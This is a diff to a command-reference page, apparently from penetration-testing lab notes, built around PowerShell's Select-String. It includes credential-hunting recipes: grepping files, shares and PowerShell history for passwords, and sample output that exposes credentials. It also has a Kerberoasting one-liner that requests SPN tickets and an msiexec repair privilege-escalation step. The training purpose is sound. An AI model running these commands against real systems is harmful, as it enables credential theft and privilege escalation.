@@ -9,6 +9,38 @@ hideFooterPagination: true
 
 {/* Generated from Commands/select-string.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Select-String: choose the operation and read the result
+
+Search file contents from PowerShell.
+
+### What the result establishes
+
+Preserve path, line number and surrounding text when matching configuration or logs.
+
+### Prerequisites and common failures
+
+It searches text patterns, not structured secrets automatically; binary content and encoding can hide otherwise relevant data.
+
+### Example 1: Search a file
+
+Run in: **Windows PowerShell**.
+
+```powershell
+Select-String -Path C:\PATH\FILE.txt -Pattern "password"
+```
+
+### Example 2: Search configuration files
+
+Run in: **Windows PowerShell**.
+
+```powershell
+Get-ChildItem -Path C:\PATH -Recurse -File -Include *.config,*.xml,*.ini -ErrorAction SilentlyContinue | Select-String -Pattern "password"
+```
+
+## Saved commands and notebook recipes
+
+Search file contents from PowerShell.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=select-string) · [All tools](/index)
@@ -50,6 +82,13 @@ N:\Contracts\private\secret.txt:1:file with all credentials
 N:\Contracts\private\credentials.txt:1:admin:SecureCredentials!
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Windows PowerShell](/modules/common-services/full-reference#windows-powershell)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Find Credentials in Network Shares">
@@ -62,6 +101,13 @@ N:\Contracts\private\credentials.txt:1:admin:SecureCredentials!
 Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern ...
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Find Credentials in Network Shares — Find Credentials in Network Shares](/password-attacks/credential-hunting-in-network-shares)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="3. Request Tickets from Enumerated SPNs">
@@ -73,6 +119,13 @@ Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern ..
 ```powershell
 setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberoasting from Windows — 3. Request Tickets from Enumerated SPNs](/active-directory/kerberoasting-windows#3-request-tickets-from-enumerated-spns)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -88,6 +141,13 @@ $string= $installed | select-string -pattern "PRODUCTNAME"
 $string[0] -match '{\w{8}-\w{4}-\w{4}-\w{4}-\w{12}}'
 Start-Process -FilePath "msiexec.exe" -ArgumentList "/fa $($matches[0])"
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — CustomActions](/privesc/windows-privesc-checklist#customactions)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -105,6 +165,21 @@ cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Powershell History](/privesc/windows-privesc-checklist#powershell-history)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Find Credentials in Network Shares](/password-attacks/credential-hunting-in-network-shares)
+
+{/* VAULT_RELATED_END */}
